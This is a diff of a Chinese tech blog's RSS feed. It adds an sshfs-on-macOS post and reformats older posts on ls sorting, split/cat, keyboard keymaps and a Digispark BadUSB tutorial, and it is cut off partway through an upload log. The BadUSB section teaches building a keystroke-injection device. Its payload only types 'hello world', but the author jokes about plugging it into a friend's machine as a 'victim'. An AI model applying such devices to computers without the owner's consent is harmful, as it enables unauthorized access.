@@ -1,18 +1,34 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WhereIsMyMind</title><link>https://hare.one/</link><atom:link href="https://hare.one/index.xml" rel="self" type="application/rss+xml"/><description>WhereIsMyMind</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en</language><lastBuildDate>Fri, 08 Jan 2021 21:23:53 +0800</lastBuildDate><item><title>Linux 下的文件按照数字编号顺序排列</title><link>https://hare.one/posts/list-and-sort/</link><pubDate>Fri, 08 Jan 2021 21:23:53 +0800</pubDate><guid>https://hare.one/posts/list-and-sort/</guid><description>&lt;p>今天在终端下使用 &lt;code>ls&lt;/code> 命令的时候，发现没办法直接满足按照阿拉伯数字顺序排列的需求。&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WhereIsMyMind</title><link>https://hare.one/</link><atom:link href="https://hare.one/index.xml" rel="self" type="application/rss+xml"/><description>WhereIsMyMind</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en</language><lastBuildDate>Fri, 25 Mar 2022 12:16:18 +0800</lastBuildDate><item><title>使用 sshfs 挂载远程目录</title><link>https://hare.one/posts/use-sshfs-to-mount-remote-directory/</link><pubDate>Fri, 25 Mar 2022 12:16:18 +0800</pubDate><guid>https://hare.one/posts/use-sshfs-to-mount-remote-directory/</guid><description>&lt;p>最近使用 ssh 到服务器上进行测试开发，但是却不能使用本地已经配置好的开发工具，所以有了想法将远程服务器的目录挂载到本地的 macOS 上。
+开发机是 macOS Monterey 12.1&lt;/p>
+&lt;p>使用 brew 安装 sshfs&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>brew install sshfs
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是提示&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Error: sshfs has been disabled because it requires closed-source macFUSE!
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>那就先安装 macFUSE 吧&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>brew install macfuse
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再去 &lt;a href="https://osxfuse.github.io/">macFUSE&lt;/a> 的项目主页上下载 sshfs 2.5.0 的 pkg 文件，进行安装&lt;/p>
+&lt;p>安装好后就可以使用下面的命令来挂载远程的目录了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mkdir ~/local/diretory
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sshfs -o idmap&lt;span style="color:#f92672">=&lt;/span>user xxx@ip:/remote/diretory ~/local/diretory
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在就可以当作本地文件进行操作了。&lt;/p>
+&lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
+&lt;!--
+&lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
+嵌入 BiliBili 视频 --></description></item><item><title>Linux 下的文件按照数字编号顺序排列</title><link>https://hare.one/posts/list-and-sort/</link><pubDate>Fri, 08 Jan 2021 21:23:53 +0800</pubDate><guid>https://hare.one/posts/list-and-sort/</guid><description>&lt;p>今天在终端下使用 &lt;code>ls&lt;/code> 命令的时候，发现没办法直接满足按照阿拉伯数字顺序排列的需求。&lt;/p>
 &lt;p>比如说有如下几个文件：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plain" data-lang="plain">1_apple.txt
-12_banana.txt
-3_orange.txt
-31_mango.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就是 &lt;code>ls&lt;/code> 命令默认的排序方式。
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plain" data-lang="plain">&lt;span style="display:flex;">&lt;span>1_apple.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>12_banana.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3_orange.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>31_mango.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就是 &lt;code>ls&lt;/code> 命令默认的排序方式。
 而我需要的却是：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plain" data-lang="plain">1_apple.txt
-3_orange.txt
-12_banana.txt
-31_mango.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 发现可以通过管道符和 &lt;code>sort&lt;/code> 命令配合来实现。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ls | sort -k1 -n
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中，&lt;code>-k1&lt;/code> 表示按照第一个区域进行排序，&lt;code>-n&lt;/code> 表示按照数值排序。
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plain" data-lang="plain">&lt;span style="display:flex;">&lt;span>1_apple.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3_orange.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>12_banana.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>31_mango.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 发现可以通过管道符和 &lt;code>sort&lt;/code> 命令配合来实现。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ls | sort -k1 -n
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中，&lt;code>-k1&lt;/code> 表示按照第一个区域进行排序，&lt;code>-n&lt;/code> 表示按照数值排序。
 只用 &lt;code>ls&lt;/code> 命令的时候，&lt;code>-k&lt;/code> 参数可以省略，但如果使用 &lt;code>ls -al&lt;/code> 命令的话，需要排序的就是第九个区域，就应该是 &lt;code>-k9&lt;/code> 了。
 另外，&lt;code>-t&lt;/code> 参数可以指定用来分隔区域的字符。当数字在文件名后面作为版本号的时候，可能会用上这个参数。&lt;/p>
 &lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
@@ -35,18 +51,18 @@
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
 嵌入 BiliBili 视频 --></description></item><item><title>Linux 下的文件分割与合并命令 Split &amp; Cat</title><link>https://hare.one/posts/split-and-cat/</link><pubDate>Tue, 13 Oct 2020 16:10:22 +0800</pubDate><guid>https://hare.one/posts/split-and-cat/</guid><description>&lt;p>最近的工作中，需要处理大型的文本文件，这在预览上很不方便，这种情况下，可以使用 Linux 下的 split 命令进行分割。&lt;/p>
 &lt;h2 id="按照文件的大小进行分割">按照文件的大小进行分割&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b 10k input_file.txt output_file -d -a &lt;span style="color:#ae81ff">3&lt;/span>
-&lt;span style="color:#75715e"># -b 值为每一输出文件的大小&lt;/span>
-&lt;span style="color:#75715e"># -d 使用数字作为后缀&lt;/span>
-&lt;span style="color:#75715e"># -a 值为后缀长度&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10k&lt;/em> 的大小进行分割，输出的分割文件以 &lt;em>output_file&lt;/em> 开头进行命名，数字作为输出的分割文件后缀，长度为 &lt;em>3&lt;/em>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ split -b 10k input_file.txt output_file -d -a &lt;span style="color:#ae81ff">3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -b 值为每一输出文件的大小&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -d 使用数字作为后缀&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -a 值为后缀长度&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10k&lt;/em> 的大小进行分割，输出的分割文件以 &lt;em>output_file&lt;/em> 开头进行命名，数字作为输出的分割文件后缀，长度为 &lt;em>3&lt;/em>&lt;/p>
 &lt;h2 id="按照文件的行数进行分割">按照文件的行数进行分割&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -l &lt;span style="color:#ae81ff">10&lt;/span> input_file.txt
-&lt;span style="color:#75715e"># -l 值为分割的行数&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10&lt;/em> 行每文件进行分割&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ split -l &lt;span style="color:#ae81ff">10&lt;/span> input_file.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -l 值为分割的行数&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10&lt;/em> 行每文件进行分割&lt;/p>
 &lt;h2 id="文件合并">文件合并&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat output* &amp;gt; new_file.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>将以 &lt;em>output&lt;/em> 开头的文件按照顺序合并，并生成 &lt;em>new_file.txt&lt;/em> 文件&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat output* &amp;gt; new_file.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将以 &lt;em>output&lt;/em> 开头的文件按照顺序合并，并生成 &lt;em>new_file.txt&lt;/em> 文件&lt;/p>
 &lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
 &lt;!--
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
@@ -292,16 +308,16 @@
 &lt;p>原本六个开关的功能，现在可以通过刷固件进行，YDKB 支持 8 层自定义按键设置 + LEDmap 设置，烧写固件也很方便，全部都可以通过 &lt;a href="http://ydkb.io">ydkb.io&lt;/a> 搞定。&lt;/p>
 &lt;h3 id="keymap">Keymap&lt;/h3>
 &lt;p>之前说 YDKB 支持 8 层自定义按键，这 8 层其实是像下面这样叠在一起的，每次按键，从 L7 开始往下找开启的层，如果该层打开，则使用该层的键位，如果键位为 TRNS，则继续向下查找，直到找到按键或到最底层。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">7 / ESC / F1 / F2 / F3 ....
-: /-----/-----/-----/-----
-: / TAB / Q / W / E ....
-: /-----/-----/-----/-----
-: /LCtrl/ A / S / D ....
-: / : : : :
-2 `--------------------------
-1 `--------------------------
-0 `--------------------------
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>下面是我的 Keymap，可以用来参考。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span style="display:flex;">&lt;span>7 / ESC / F1 / F2 / F3 ....
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: /-----/-----/-----/-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: / TAB / Q / W / E ....
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: /-----/-----/-----/-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: /LCtrl/ A / S / D ....
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>: / : : : :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2 `--------------------------
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1 `--------------------------
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0 `--------------------------
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>下面是我的 Keymap，可以用来参考。&lt;/p>
 &lt;h4 id="colemak-keyboard-layout">Colemak Keyboard Layout&lt;/h4>
 &lt;img src="\Pictures\hhkb-ble6.png" alt="hhkb-ble6" style="zoom:100%;" />
 &lt;center>Layer0&lt;/center>
@@ -366,68 +382,68 @@
 &lt;p>要使用 Digispark 制作 BadUSB，首先要安装开发环境，在这里选择 Arduino。我的开发环境是 macOS，所以后续介绍以 macOS 为准。&lt;/p>
 &lt;p>可以在 &lt;a href="https://www.arduino.cc/">Arduino&lt;/a> 官网上选择适配自己开发环境的安装版本。&lt;/p>
 &lt;p>安装好 Arduino 后，在 &lt;strong>Preferences&lt;/strong> -&amp;gt; &lt;strong>Additional Boards Manager URLs&lt;/strong> 处输入：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">http://digistump.com/package_digistump_index.json
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来在 &lt;strong>Tools&lt;/strong> -&amp;gt; &lt;strong>Board&lt;/strong> -&amp;gt; &lt;strong>Boards Manager&lt;/strong>，安装 &lt;strong>Digistump AVR Boards&lt;/strong> 包。
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">http://digistump.com/package_digistump_index.json
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来在 &lt;strong>Tools&lt;/strong> -&amp;gt; &lt;strong>Board&lt;/strong> -&amp;gt; &lt;strong>Boards Manager&lt;/strong>，安装 &lt;strong>Digistump AVR Boards&lt;/strong> 包。
 等待安装好，选择 &lt;strong>Tools&lt;/strong> -&amp;gt; &lt;strong>Board&lt;/strong> -&amp;gt; &lt;strong>Digistump AVR Boards&lt;/strong> -&amp;gt; &lt;strong>Digispark(Default - 16.5 Mhz)&lt;/strong>，此时 Arduino IDE 就可以成功识别 Digispark 开发板了。&lt;span class="spoiler" >&lt;del>居然没有出现驱动方面的问题，撒花&lt;/del>&lt;/span>&lt;/p>
 &lt;h3 id="编写一份-helloworld-吧">编写一份 helloworld 吧！&lt;/h3>
 &lt;p>既然是第一次玩 Digispark 开发板，怎么能不写一份 hello world 呢：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
-&lt;span style="color:#75715e">// put your setup code here, to run once:
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">2000&lt;/span>);
-DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); &lt;span style="color:#75715e">//GUI 键在 macOS 下是 ⌘ 键，在 Windows 下是徽标键
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
-DigiKeyboard.println(&lt;span style="color:#e6db74">&amp;#34;notepad&amp;#34;&lt;/span>);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
-DigiKeyboard.println(&lt;span style="color:#e6db74">&amp;#34;hello, world!&amp;#34;&lt;/span>);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
-}
-&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">loop&lt;/span>() {
-&lt;span style="color:#75715e">// put your main code here, to run repeatedly
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>点击 Verify 验证一下代码以防出错，然后就……报错了……&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// put your setup code here, to run once:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">2000&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); &lt;span style="color:#75715e">//GUI 键在 macOS 下是 ⌘ 键，在 Windows 下是徽标键
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.println(&lt;span style="color:#e6db74">&amp;#34;notepad&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(KEY_ENTER);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.println(&lt;span style="color:#e6db74">&amp;#34;hello, world!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">loop&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// put your main code here, to run repeatedly
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>点击 Verify 验证一下代码以防出错，然后就……报错了……&lt;/p>
 &lt;p>此处 Error 信息：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">fork/exec ~/Library/Arduino15/packages/arduino/tools/avr-gcc/4.8.1-arduino5/bin/avr-g++: bad CPU type in executable
-Error compiling for board Digispark (Default - 16.5mhz).
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 找到了原因：从 macOS Catalina 开始，不再支持 32 位程序，所以需要替换掉 Digispark 自带的 32 位 AVR 编译工具。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span style="display:flex;">&lt;span>fork/exec ~/Library/Arduino15/packages/arduino/tools/avr-gcc/4.8.1-arduino5/bin/avr-g++: bad CPU type in executable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Error compiling for board Digispark (Default - 16.5mhz).
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 找到了原因：从 macOS Catalina 开始，不再支持 32 位程序，所以需要替换掉 Digispark 自带的 32 位 AVR 编译工具。&lt;/p>
 &lt;p>在 terminal 里运行：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cd ~/Library/Arduino15/packages/arduino/tools/avr-gcc
-mv 4.8.1-arduino5 orig.4.8.1
-ln -s /Applications/Arduino.app/Contents/Java/hardware/tools/avr 4.8.1-arduino5
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>再次验证，提示已经成功编译。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cd ~/Library/Arduino15/packages/arduino/tools/avr-gcc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mv 4.8.1-arduino5 orig.4.8.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ln -s /Applications/Arduino.app/Contents/Java/hardware/tools/avr 4.8.1-arduino5
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再次验证，提示已经成功编译。&lt;/p>
 &lt;h3 id="烧录代码">烧录代码&lt;/h3>
 &lt;p>现在就可以上传代码到硬件上了，点击 &lt;strong>Upload&lt;/strong>，在 60 秒内插入 Digispark 开发板完成上传。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">Running Digispark Uploader...
-Plug in device now... &lt;span style="color:#f92672">(&lt;/span>will timeout in &lt;span style="color:#ae81ff">60&lt;/span> seconds&lt;span style="color:#f92672">)&lt;/span>
-&amp;gt; Please plug in the device ...
-&amp;gt; Press CTRL+C to terminate the program.
-&amp;gt; Device is found!
-connecting: 16% complete
-connecting: 22% complete
-connecting: 28% complete
-connecting: 33% complete
-&amp;gt; Device has firmware version 2.2
-&amp;gt; Device signature: 0x1e930b
-&amp;gt; Available space &lt;span style="color:#66d9ef">for&lt;/span> user applications: &lt;span style="color:#ae81ff">6522&lt;/span> bytes
-&amp;gt; Suggested sleep time between sending pages: 7ms
-&amp;gt; Whole page count: &lt;span style="color:#ae81ff">102&lt;/span> page size: &lt;span style="color:#ae81ff">64&lt;/span>
-&amp;gt; Erase &lt;span style="color:#66d9ef">function&lt;/span> sleep duration: 714ms
-parsing: 50% complete
-&amp;gt; Erasing the memory ...
-erasing: 55% complete
-erasing: 60% complete
-erasing: 65% complete
-&amp;gt; Starting to upload ...
-writing: 70% complete
-writing: 75% complete
-writing: 80% complete
-&amp;gt; Starting the user app ...
-running: 100% complete
-&amp;gt;&amp;gt; Micronucleus &lt;span style="color:#66d9ef">done&lt;/span>. Thank you!
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>将板子插入&lt;span class="spoiler" >&lt;del>受害者&lt;/del>&lt;/span>朋友的 Windows 设备上，就可以看到运行 notepad 并输出 hello world 了。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Running Digispark Uploader...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Plug in device now... &lt;span style="color:#f92672">(&lt;/span>will timeout in &lt;span style="color:#ae81ff">60&lt;/span> seconds&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Please plug in the device ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Press CTRL+C to terminate the program.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Device is found!
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>connecting: 16% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>connecting: 22% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>connecting: 28% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>connecting: 33% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Device has firmware version 2.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Device signature: 0x1e930b
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Available space &lt;span style="color:#66d9ef">for&lt;/span> user applications: &lt;span style="color:#ae81ff">6522&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Suggested sleep time between sending pages: 7ms
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Whole page count: &lt;span style="color:#ae81ff">102&lt;/span> page size: &lt;span style="color:#ae81ff">64&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Erase &lt;span style="color:#66d9ef">function&lt;/span> sleep duration: 714ms
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parsing: 50% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Erasing the memory ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>erasing: 55% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>erasing: 60% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>erasing: 65% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Starting to upload ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>writing: 70% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>writing: 75% complete
